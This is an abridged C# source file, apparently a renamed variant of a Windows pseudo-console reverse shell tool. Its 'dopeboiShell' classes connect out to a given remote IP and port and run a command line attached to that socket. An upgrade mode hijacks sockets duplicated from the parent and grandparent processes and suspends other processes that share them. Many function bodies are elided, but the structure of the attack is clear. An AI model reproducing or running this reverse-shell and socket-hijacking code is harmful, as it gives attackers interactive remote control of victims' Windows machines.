...
public class dopeboiShellException : Exception
{
    private const string error_string = "[-] dopeboiShellException: ";

    public dopeboiShellException() { }

    public dopeboiShellException(string message) : base(error_string + message) { }
}
...
public static class SocketHijacking
{
    ...
    private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle)
    {
        ...
        if (status == 0)
        {
            // we need an overlapped socket for the dopeboi process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
    ...
    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)
    {
        ...
        if (targetSocketHandle == IntPtr.Zero)
            throw new dopeboiShellException("No sockets found, so no hijackable sockets :( Exiting...");
    ...
    public static void SetSocketBlockingMode(IntPtr socket, int mode)
    {
        ...
        if (result == -1)
            throw new dopeboiShellException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
    }
}
...
public struct ParentProcessUtilities
{
    ...
    public static Process GetParentProcess(IntPtr handle)
    {
        ...
        if (status != 0)
            throw new dopeboiShellException(status.ToString());
        try
        {
...
public static class dopeboiShell
{
    private const string errorString = "{{{dopeboiShellException}}}\r\n";
    ...
    private static void InitWSAThread()
    {
        ...
        if (WSAStartup(2 << 8 | 2, out data) != 0)
            throw new dopeboiShellException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
    }
    ...
    private static IntPtr connectRemote(string remoteIp, int remotePort)
    {
        ...
        {
            throw new dopeboiShellException("Specified port is invalid: " + remotePort.ToString());
        }
        ...
        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
        {
            ...
            throw new dopeboiShellException(String.Format("WSAConnect failed with error code: {0}", error));
        }
    ...
    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
    {
        ...
        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new dopeboiShellException("Could not create the InputPipe");
        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new dopeboiShellException("Could not create the OutputPipe");
    }
    ...
    private static void EnableVirtualTerminalSequenceProcessing()
    {
        ...
        {
            throw new dopeboiShellException("Could not get console mode");
        }
        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        if (!SetConsoleMode(hStdOut, outConsoleMode))
        {
            throw new dopeboiShellException("Could not enable virtual terminal processing");
        }
    }

    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr dopeboiInputPipeRead, ref IntPtr dopeboiOutputPipeWrite, uint rows, uint cols)
    {
        int result = -1;
        ...
        result = CreatePseudoConsole(consoleCoord, dopeboiInputPipeRead, dopeboiOutputPipeWrite, 0, out handlePseudoConsole);
        return result;
    }
    ...
    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        ...
        {
            throw new dopeboiShellException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new dopeboiShellException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new dopeboiShellException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
        }
        return startupInfo;
    }
    ...
    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
    {
        ...
        if (!success)
        {
            throw new dopeboiShellException("Could not create process. " + Marshal.GetLastWin32Error());
        }
        return pInfo;
    }
    ...
    public static string SpawndopeboiShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
    {
            ...
            if (upgradeShell)
            {
                ...
                if (shellSocket == IntPtr.Zero && parentProcess != null)
                {
                    ...
                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                    {
                        ...
                        {
                            throw new dopeboiShellException("No \\Device\\Afd objects found. Socket duplication failed.");
                        }
                        else
                        {
        ...
        else
        {
            if (upgradeShell)
            {
                output += string.Format("Could not upgrade shell to fully interactive because dopeboi is not compatible on this system");
                return output;
            }
            shellSocket = connectRemote(remoteIp, remotePort);
            if (shellSocket == IntPtr.Zero)
        ...
        // when the dopeboi is destroyed.
        if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
        if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
        if (upgradeShell) {
            // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our dopeboi process
        ...
        output += "dopeboiShell kindly exited.\r\n";
        return output;
    }
}

public static class dopeboiShellMainClass
{
    ...
    private static void CheckArgs(string[] arguments)
    {
        if (arguments.Length < 2)
            throw new dopeboiShellException("\r\ndopeboiShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
    }
    ...
    private static string CheckRemoteIpArg(string ipString)
    {
        ...
        if (!IPAddress.TryParse(ipString, out address))
            throw new dopeboiShellException("\r\ndopeboiShell: Invalid remoteIp value" + ipString);
        return ipString;
    }
    ...
    private static int CheckInt(string arg)
    {
        ...
        if (!Int32.TryParse(arg, out ret))
            throw new dopeboiShellException("\r\ndopeboiShell: Invalid integer value " + arg);
        return ret;
    }
    ...
    public static string dopeboiShellMain(string[] args)
    {
        string output = "";
        ...
        else
        {
            ...
            try
            {
                ...
                output = dopeboiShell.SpawndopeboiShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
            }
            catch (Exception e)
            {
                Console.WriteLine("\n" + e.ToString() + "\n");
...
class MainClass
{
    ...
    {
        Console.Out.Write(dopeboiShellMainClass.dopeboiShellMain(args));
    }
}
